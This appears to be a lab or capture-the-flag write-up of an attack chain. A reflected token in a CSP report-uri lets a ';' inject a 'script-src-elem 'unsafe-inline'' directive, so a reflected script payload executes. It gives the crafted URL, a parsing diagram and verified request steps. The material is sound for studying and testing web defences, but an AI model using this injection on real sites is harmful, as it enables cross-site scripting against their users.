# Attack Chain — CSP policy injection via report-uri token

## Data flow
```
Attacker crafts URL   /?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
   │
   ├─► [INPUT 1] search → echoed VERBATIM into <h1> (no encoding at all)
   │
   └─► [INPUT 2] token → interpolated VERBATIM into the CSP header's report-uri value:
       Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self';
                                style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
   │
   ▼
[PROCESSING — victim browser parses the POLICY, splitting directives on ';' FIRST,
before considering value contexts]:
   directive 1: default-src 'self'
   directive 2: object-src 'none'
   directive 3: script-src 'self'
   directive 4: style-src 'self'
   directive 5: report-uri /csp-report?token=
   directive 6: script-src-elem 'unsafe-inline'     ◄── FORGED (from the token value)
   │
   ▼
[SINK] victim parser builds <script>alert(1)</script> from the echo; CSP enforcement
consults script-src-elem (more specific than script-src for <script> ELEMENTS):
'unsafe-inline' ALLOWS it
   │
   ▼
[TRUST BOUNDARY CROSSED] defense-in-depth collapsed by its own construction —
the policy meant to contain the echo now PERMITS it
   ▼
RESULT: alert(1) in app origin on crafted-URL load
```

## Why this shape (constraint-satisfying)
- The echo needs no breakout (h1 text context, verbatim) — plain `<script>` suffices.
- The CSP needs a same-parser directive the attacker can smuggle: `;` is the
  directive separator AND legal (unencoded) in the token value — one character
  promotes URL data into policy syntax.
- `script-src-elem` (not `script-src`) because it OVERRIDES for element loads in
  Chrome; `'unsafe-inline'` because the payload is inline. Chrome-only per the
  objective (`script-src-elem` support).
- No second encoding layer interferes (token reflected raw into the header).

## Expected response sequence (verified)
1. `GET /?search=<script>alert(1)</script>` (no token) → 200, echo present, NO fire
   (CSP blocks; baseline proves the policy was the ONLY barrier).
2. Same + `&token=;script-src-elem 'unsafe-inline'` → header carries the forged
   directive → inline script executes on load.
3. Real-browser `alert(1)` → `is-solved` (first poll).